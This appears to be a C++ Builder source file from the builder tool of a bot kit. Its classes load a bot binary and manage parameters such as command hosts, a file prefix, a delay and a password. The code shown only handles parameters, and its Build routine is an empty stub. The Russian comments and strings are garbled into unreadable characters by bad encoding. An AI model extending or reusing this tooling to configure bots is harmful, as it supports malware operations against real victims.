//---------------------------------------------------------------------------


#pragma hdrstop

#include "SysUtils.hpp"
#include "BuilderUtils.h"
#include "Memory.h"
#include "Crypt.h"
#include "Strings.h"

#include "Config.h"

//---------------------------------------------------------------------------

PCHAR Error_MemAlloc = "������ ��������� ������!";
PCHAR Error_NoSourceFile = "�������� ���� �� ������!";

PCHAR Status_Warning = "��������������: ";
PCHAR Status_Error   = "������:         ";

PCHAR StrNoParamValue = "�� ����������� �������� ��������� \r\n --";

PCHAR ParamTitle_Hosts   = "�������� ����� ����";
PCHAR ParamTitle_Prefix  = "������� ����";
PCHAR ParamTitle_Delay   = "�������� �������";
PCHAR ParamTitle_Password = "�������� ������";



bool Builder::PackStringsToDoubleZeroEndLine(TStrings *Lines,
									bool CryptLines, bool TrimLines,
									PCHAR &OutBuf, DWORD &OutBufSize)
{
	//  ������� ����������� ������ � ���� ������. ������ ������ �����
	//  �������� ������� ��������. � ����� ��������� ������ ����� ������
	//  ��� ������� �������. ������ ������ ����� ���������������.

	if (Lines == NULL || Lines->Count == 0)
		return false;

	OutBuf = NULL;
	OutBufSize = 0;


	UnicodeString S;


	// ���������� ����� ������ � ������� ������ ������
	for (int i = Lines->Count - 1; i >= 0; i--)
    {
		S = Lines->Strings[i];
		DWORD OldLength = S.Length();

		if (TrimLines)
			S = S.Trim();

		if (S.Length() == 0)
			Lines->Delete(i);
		else
		{
			if (TrimLines && S.Length() != OldLength)
				Lines->Strings[i] = S;
			OutBufSize += S.Length() + 1;
        }
	}
	if (OutBufSize == 0) return false;

	OutBufSize++; // ����������� ����� ��� ��������������� ����

	// �������� ������
	OutBuf = (PCHAR)MemAlloc(OutBufSize);
	if (OutBuf == NULL)
	{
		throw Exception(Error_MemAlloc);
    }

    PCHAR Tmp = OutBuf;

	// �������� ������
	for (int i = 0; i < Lines->Count; i++)
    {
		S = Lines->Strings[i];
		// �������� ������
		DWORD SL = S.Length();
		PCHAR Line = NULL;

		if (CryptLines)
		{
			Line = STR::Alloc(SL);
			Decrypt(AnsiString(S).c_str(), Line);
		}
		else
			Line = AnsiString(S).c_str();

		m_memcpy(Tmp, Line, SL);

		if (CryptLines)
			STR::Free(Line);

		// ������� ���������
		Tmp += SL;
		*Tmp = 0;
		Tmp++;
	}

	// ��������� �������������� ����
	*Tmp = 0;

	return true;
}


//****************************************************************************
//                             TBotBuilder
//****************************************************************************

__fastcall TBotBuilder::TBotBuilder(TComponent* AOwner)
	: TComponent(AOwner)
{
	FFile = new TMemoryStream();
	FParams = new TCollection(__classid(TBotParam));
	FModules = new TList();
	FActiveModules = new TList();

	// ��������� �������� ���������
	FPrefix    = new TBotParam(this, true, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, ParamTitle_Prefix);
	FDelay     = new TBotParam(this, true, BOTPARAM_DELAY, MAX_DELAY_SIZE, ParamTitle_Delay);
	FHosts     = new TBotParam(this, true, BOTPARAM_MAINHOSTS, MAX_HOSTS_BUF_SIZE, ParamTitle_Hosts);
	FPassword  = new TBotParam(this, true, BOTPARAM_MAINPASSWORD, MAX_PASSWORD_SIZE, ParamTitle_Password);

}

__fastcall TBotBuilder::~TBotBuilder()
{
	delete FParams;
	delete FModules;
	delete FActiveModules;
	delete FFile;
}

// ������� ��������� �������� ����
void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
{
	FFile->Size = 0;
	FSourceFileName = "";
	UpdateResultFileName(true);
	TFileStream* S = new TFileStream(FileName, fmOpenRead);

	FFile->LoadFromStream(S);
    FFile->Position = 0;

	delete S;

	FSourceFileName = FileName;
	UpdateResultFileName(false);
}


// ������� �������� ������
 bool __fastcall TBotBuilder::Build()
{
	if (FFile->Size == 0)
		throw Exception(Error_NoSourceFile);

	// ��������� ���������
	TStringList* Errors = new TStringList();
	TBotParamStatus Status = CheckParams(Errors);
	UnicodeString ErrorText = Errors->Text;
    delete Errors;

	if (Status != psOk)
	{

		if (Status == psError)
            throw Exception(ErrorText);
    }

	// ����������

	return false;
}


// ������� ��������� ��������� ����������
TBotParamStatus __fastcall TBotBuilder::CheckParams(TStrings* Errors)
{
	TBotParamStatus Result = psOk;

	for (int i = 0; i < FParams->Count; i++)
	{
		TBotParam* Param = (TBotParam*)FParams->Items[i];
		TBotParamStatus Status = Param->Status();
		if (Status == psOk) continue;

		// ����� ������� �������� ������� ��������
		// ������� ����������� ���������
		if (Status > Result)
			Result = Status;

		// ��������� ������
		if (Errors)
		{
			UnicodeString Str;
			switch (Status) {
				case psWarning: Str = Status_Warning; break;
				case psError:   Str = Status_Error; break;
			}

			Str += StrNoParamValue;
			Str += Param->DisplayName;

			Errors->Add(Str);
        }
	}

	return Result;
}


// ������� ���������� ����� ��������� �������� ���������
void __fastcall TBotBuilder::ParamValueChanged(TBotParam* Sender)
{
	if (Sender == FPrefix)
	{
		// �������� �������, ������ ��� ��������������� �����
		UpdateResultFileName(false);
    }
}

// ������� �������� ��� ��������������� �����
void __fastcall TBotBuilder::UpdateResultFileName(bool Reset)
{
	// ���������� ���������
	if (Reset)
	{
		FResultFileName = "";
		FResultFileNameChanged = false;
        return;
	}

	// ���� ��� ����� �������� ������������� �� �������
	if (FResultFileNameChanged) return;

	if (FPrefix->IsEmpty())
	{
		// ������� �� ����������
		FResultFileName = "";
		return;
    }

	// �������� ���
	UnicodeString Path = ExtractFilePath(FSourceFileName);
	UnicodeString Ext  = ExtractFileExt(FSourceFileName);

	FResultFileName = Path + FPrefix->AsUnicodeString + Ext;
}



//****************************************************************************
//                             TBotParam
//****************************************************************************
__fastcall TBotParam::TBotParam(TBotBuilder* AOwner, bool NotNull,
	const char* Name, DWORD Size, const char* Title)
	: TCollectionItem(AOwner->FParams)
{
	if (STRA::IsEmpty(Name))
		throw Exception("Unknown param name!");

	if (Size == 0)
		throw Exception("Unknown param size!");

	FOwner = AOwner;
	FTitle = Title;
	FName = Name;
	FNotNull = NotNull;
	FSize = Size;
	FDataSize = 0;
	FDataSize = 0;
	FData = (PCHAR)malloc(FSize);
	if (!FData)
		throw Exception(Error_MemAlloc);

    m_memset(FData, 0, FSize);
}


__fastcall TBotParam::~TBotParam()
{
	free(FData);
}

// ������� ���������� ��������� ��������
TBotParamStatus __fastcall TBotParam::Status()
{
	if (FDataSize == 0)
	{
		if (FNotNull)
			return psError;
		else
			return psWarning;
	}
	return psOk;
}


// ������� ���������� ������������ ��� ���������
UnicodeString __fastcall TBotParam::GetDisplayName(void)
{
	if (FTitle.IsEmpty())
		return FName;
	else
		return FTitle;
}

// ������� ���������� ������ ���� �������� ������
bool __fastcall TBotParam::IsEmpty()
{
	return FDataSize == 0;
}

// ������� ������� ��������
void __fastcall TBotParam::Clear()
{
	FDataSize = 0;
	m_memset(FData, 0, FSize);
}


// ������� ������������� �������� ���������
void __fastcall TBotParam::SetValue(PCHAR Value, DWORD ValueSize)
{
	Clear();

	if (Value && !ValueSize)
		ValueSize = STRA::Length(Value);

	if (Value && ValueSize)
	{
		m_memcpy(FData, Value, ValueSize);
		FDataSize = ValueSize;
	}

	Changed();
}


void __fastcall TBotParam::DoChanged()
{

}

void __fastcall TBotParam::Changed()
{
	DoChanged();
	FOwner->ParamValueChanged(this);
}


UnicodeString __fastcall TBotParam::GetAsUnicodeString()
{
	return FData;
}

void __fastcall TBotParam::SetAsUnicodeString(const UnicodeString &Value)
{
	AnsiString S = Value;
    SetValue(S.c_str(), S.Length());
}

DWORD __fastcall TBotParam::GetAsLong()
{
	int Result = 0;
	if (FDataSize)
		TryStrToInt(FData, Result);
	return Result;
}

void __fastcall TBotParam::SetAsLong(DWORD Value)
{
	AnsiString S(Value);
	SetValue(S.c_str(), S.Length());
}


//****************************************************************************
//                             TBotModule
//****************************************************************************
TBotModule::TBotModule(TBotBuilder* AOwner)
	: TComponent(AOwner)
{
	FBuilder = AOwner;
	if (AOwner)
		AOwner->FModules->Add(this);
}
